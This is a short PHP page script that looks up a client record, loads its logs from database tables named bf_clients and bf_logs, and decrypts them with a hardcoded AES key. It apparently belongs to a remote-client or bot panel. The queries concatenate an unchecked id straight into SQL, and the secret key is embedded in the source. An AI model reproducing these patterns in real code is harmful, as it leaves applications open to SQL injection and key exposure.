<?php

$smarty->assign('rand_name', mt_rand(0000000000, 9999999999));

get_function('size_format');
get_function('ts2str');

function get_log($row){
    global $logs, $client;
    
    $key = md5($client->id . $client->name . $client->post_date . 'WMOARQog7wEGdTRH2ipnmAn71ptAfM9g');
    $row->log = openssl_decrypt($row->log, 'AES-256-CBC', sha1($key), false, substr($key, 0, 16));
    $row->log = json_decode($row->log);
    $logs[] = $row;
}

if(!empty($Cur['id'])){
    $client = $mysqli->query('SELECT * from bf_clients WHERE (id = '.$Cur['id'].') LIMIT 1');
    if($client->id == $Cur['id']){
        $mysqli->query('SELECT * from bf_logs WHERE (client_id = '.$Cur['id'].') ORDER by post_date DESC', null, 'get_log');
        $smarty->assign('logs', $logs);
        $smarty->assign('client', $client);
    }
}

?>